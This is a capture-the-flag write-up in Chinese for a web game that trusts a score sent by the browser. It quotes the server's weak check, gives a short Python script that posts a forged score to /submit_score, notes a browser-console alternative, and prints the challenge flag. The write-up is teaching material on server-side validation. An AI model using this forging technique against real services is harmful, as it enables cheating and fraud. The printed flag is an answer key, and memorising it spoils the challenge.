# aimfactory

## 题目简述

网页要求 10 秒内点击 1000 个移动目标。分数完全由浏览器 JavaScript 维护，并原样 POST 到 `/submit_score`；服务端只判断收到的整数是否不小于 1000。目标是绕过客户端游戏逻辑直接伪造分数。

## 解题过程

服务端校验只有：

```python
score = int(request.json.get("score", 0))
if score >= 1000:
    return {"flag": get_flag()}
```

它没有保存点击事件、计时状态或会话内成绩。因此可直接发送符合接口格式的请求：

```python
import requests

base_url = input("题目根地址：").rstrip("/")
response = requests.post(
    f"{base_url}/submit_score",
    json={"score": 1000},
)
print(response.json()["flag"])
```

也可以在浏览器控制台把全局变量 `score` 改为 `1000` 后触发 `submitScore()`，但直接构造 HTTP 请求更能说明服务端缺陷。响应返回：

```text
grey{y0u_4r3_h1m0thY_ta}
```

## 方法总结

浏览器状态永远由用户控制。计分、权限和奖励条件必须由服务端依据可信事件重新计算；仅把客户端分数发回服务端再比较，等价于让用户自行声明成绩。
